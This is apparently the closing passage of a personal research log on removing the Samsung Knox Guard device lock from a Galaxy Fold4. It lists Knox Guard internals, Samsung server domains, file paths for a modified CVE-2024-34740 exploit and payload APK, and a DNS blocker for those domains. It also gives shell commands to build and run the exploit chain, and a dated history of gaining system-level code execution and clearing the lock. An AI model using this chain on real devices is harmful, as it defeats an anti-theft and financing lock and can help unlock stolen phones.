  |     |-- handleBootCompleted()
  |     |-- lockSeDevice(context, errorCode)
  |
  |-- KGEventHandler
        |-- ON_BOOT_COMPLETED -> SystemIntentProcessor.handleBootCompleted()
        |-- ON_SETUP_WIZARD_COMPLETED
        |-- ON_USER_PRESENT
        |-- ON_PACKAGE_REPLACED_OR_REMOVED
        |-- ON_PACKAGE_DATA_CLEARED -> lockSeDevice(ERROR_CLIENT_APP_DATA_CLEARED="3001")
```

### Error Codes

| Code | Constant | Meaning |
|---|---|---|
| 3001 | ERROR_CLIENT_APP_DATA_CLEARED | kgclient data was cleared via `pm clear` |
| 3020 | ERROR_CLIENT_INTEGRITY | Generic integrity check failure |
| 3040 | ERROR_CLIENT_INTEGRITY_FOR_CHINA | China-specific integrity failure |
| 8133 | (bitfield) | Abnormal detection: kgclient + all 6 components disabled |

### Key Constants

```java
// Permission
KG_PERMISSION = "com.samsung.android.knoxguard.STATUS"
KG_PACKAGE_NAME = "com.samsung.android.kgclient"

// System Properties
KG_SYSTEM_PROPERTY = "knox.kg.state"
KG_OTP_BIT_SYSTEM_PROPERTY = "ro.boot.kg.bit"

// Intent Actions
INTENT_RETRY_LOCK = "com.samsung.android.knoxguard.RETRY_LOCK"
INTENT_KG_PACKAGE_ADDED = "com.samsung.kgclient.android.intent.action.KG_PACKAGE_ADDED"
INTENT_SETUPWIZARD_COMPLETE = "com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE"

// Content Provider
KG_LOG_URI = "content://com.samsung.android.kgclient.statusprovider/CONTENT_LOG"
```

### Samsung KG Server Domains

| Domain | Purpose |
|---|---|
| `us-kcs-api.samsungknox.com` | US KG API endpoint |
| `kcs-api.samsungknox.com` | Global KG API endpoint |
| `eu-kcs-api.samsungknox.com` | EU KG API endpoint |
| `cn-kcs-api.samsungknox.com` | China KG API endpoint |
| `gslb.samsungknox.com` | Global server load balancer |
| `knoxguard.samsungknox.com` | KG web portal |
| `knox-guard.samsungknox.com` | KG web portal (alt) |
| `kgapi.samsungknox.com` | KG API (alt) |

---

## Complete File Inventory

### Mac-Side Files

| Path | Description |
|---|---|
| `/Users/kyin/Downloads/AbxOverflow/` | CVE-2024-34740 exploit (modified for Samsung) |
| `/Users/kyin/Downloads/AbxOverflow/app/` | Exploit app source |
| `/Users/kyin/Downloads/AbxOverflow/droppedapk/` | Payload APK source (UID 1000) |
| `/Users/kyin/Downloads/AbxOverflow/run_exploit.sh` | Mac-side orchestrator |
| `/Users/kyin/Downloads/AbxOverflow/utils/moveapk.sh` | Copies droppedapk into exploit assets |
| `/Users/kyin/Downloads/AbxOverflow/KG_UNLOCK_GUIDE.md` | Original walkthrough |
| `/Users/kyin/Downloads/AbxOverflow/droppedapk-v12-stable.apk` | Pre-built droppedapk |
| `/Users/kyin/Downloads/AbxOverflow/droppedapk-v15-recon.apk` | Recon build |
| `/Users/kyin/Downloads/AbxOverflow/kg_research_agent_output.txt` | Research: KnoxGuardNative |
| `/Users/kyin/Downloads/AbxOverflow/kg_8133_research_output.txt` | Research: 8133 bitfield |
| `/Users/kyin/Downloads/AbxOverflow/kg_kgclient_research.txt` | Research: kgclient behavior |
| `/Users/kyin/Downloads/AbxOverflow/session_log.txt` | Raw session log (~29 MB) |
| `/Users/kyin/adb_enabler/` | Device Owner APK source |
| `/Users/kyin/adb_enabler/adbenab.apk` | Built Device Owner APK |
| `/Users/kyin/Downloads/serve_apk/` | HTTP server directory |
| `/Users/kyin/Downloads/serve_apk/adbenab.apk` | DO APK copy for serving |
| `/Users/kyin/Downloads/serve_apk/provision_qr.png` | QR code for provisioning |
| `/Users/kyin/Downloads/serve_apk/testdpc.apk` | TestDPC (not used in final flow) |
| `/Users/kyin/kg_block_dns.py` | DNS blocker for Samsung KG domains |
| `/Users/kyin/Projects/Fold4/` | Project snapshot and documentation |

### Tool Paths

| Tool | Path | Version/Notes |
|---|---|---|
| ADB | `/opt/homebrew/bin/adb` | Android Debug Bridge |
| Java 17 | `/opt/homebrew/opt/openjdk@17` | Required for Gradle |
| Android SDK | `/opt/homebrew/share/android-commandlinetools` | Build tools 33.0.2, platform-33 |
| Build tools | `/opt/homebrew/share/android-commandlinetools/build-tools/33.0.2` | aapt2, d8, zipalign, apksigner |

### Key Commands

```bash
# Check device state
/opt/homebrew/bin/adb devices
/opt/homebrew/bin/adb shell getprop ro.boot.kg
/opt/homebrew/bin/adb shell getprop knox.kg.state
/opt/homebrew/bin/adb shell getprop ro.boot.kg.bit
/opt/homebrew/bin/adb shell dumpsys package com.example.abxoverflow.droppedapk | grep userId

# Build full chain
cd /Users/kyin/Downloads/AbxOverflow
export JAVA_HOME=/opt/homebrew/opt/openjdk@17
./gradlew :droppedapk:assembleRelease && bash utils/moveapk.sh && ./gradlew :app:assembleDebug

# Run exploit
/opt/homebrew/bin/adb install -r app/build/outputs/apk/debug/app-debug.apk
bash run_exploit.sh

# Launch droppedapk manually
/opt/homebrew/bin/adb shell am start -n com.example.abxoverflow.droppedapk/.MainActivity --ei action 36 --activity-clear-task

# Monitor KG state
while true; do echo "$(date '+%H:%M:%S') kg=$(/opt/homebrew/bin/adb shell getprop knox.kg.state 2>/dev/null) adb=$(/opt/homebrew/bin/adb get-state 2>/dev/null)"; sleep 3; done

# Start APK server
cd /Users/kyin/Downloads/serve_apk && python3 -m http.server 8888

# Start DNS blocker
sudo python3 /Users/kyin/kg_block_dns.py

# AT modem access
screen /dev/tty.usbmodemRFCW2006DLA2 115200
```

---

## Revision History

| Date | Change |
|---|---|
| 2026-03-18 | Initial recon. Dead ends: AT modem, Heimdall, Thor, emergency dialer |
| 2026-03-19 AM | QR provisioning breakthrough. ADB access achieved. First failed KG removal attempts |
| 2026-03-19 PM | CVE-2024-34740 exploit working. UID 1000 code execution in system_server |
| 2026-03-19 PM | KnoxGuardSeService reflection. Service methods discovered. 8133 cleared |
| 2026-03-19 PM | KnoxGuardNative discovery. TrustZone RPMB state changed: Locked(3) -> Active(2) |
| 2026-03-19 EVE | Auto-unlock v11-AUTOBOOT working. Guardian thread v12 tested. adb install -r corruption discovered |
| 2026-03-19 EVE | kgclient re-lock behavior identified. Factory reset. Comprehensive documentation written |
